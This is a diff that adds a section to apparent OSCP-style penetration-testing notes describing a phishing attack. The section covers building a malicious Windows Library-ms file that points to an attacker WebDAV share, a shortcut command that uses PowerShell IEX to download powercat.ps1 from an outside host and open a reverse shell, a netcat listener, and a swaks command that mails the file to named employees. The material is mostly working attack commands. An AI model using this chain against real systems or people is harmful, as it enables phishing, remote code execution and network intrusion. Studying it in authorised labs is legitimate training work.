@@ -918,6 +918,45 @@ smtp-user-enum -M VRFY -U username.txt -t <IP> # -M means mode, it can be RCPT, 
 #Sending emain with valid credentials, the below is an example for Phishing mail attack
 sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
 ```
+### SMTP - swaks Phishing mail
+- Open Windows prep machine -> Open the VisualStudio Code -> open new file name it as config.Library-ms
+- Transfer using ssh below commands
+```powershell
+## config.Library-ms file start -----------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://192.168.45.247</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+##config.Library-ms file end ----------------------------
+
+##copythis config.Library-ms into kali working directory
+>/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
+>sudo service ssh start
+>scp .\config.Library-ms kali@192.168.45.242:/home/kali/Desktop/HTB/OSCP/AD/beyond/
+#Inter below command on windows shortcut name itinstall
+>powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.224:8000/powercat.ps1'); powercat -c 192.168.45.224 -p 4444 -e powershell"
+>nc -nlvp 4444
+>sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach config.Library-ms --server 192.168.208.242 --body body.txt --header "Subject: Staging Script" --suppress-data -ap
+nc -nlvp 4444>whoami
+>hostname
+>ipconfig 
+#172.16.120.243
+```
 
 ## LDAP Enumeration
 
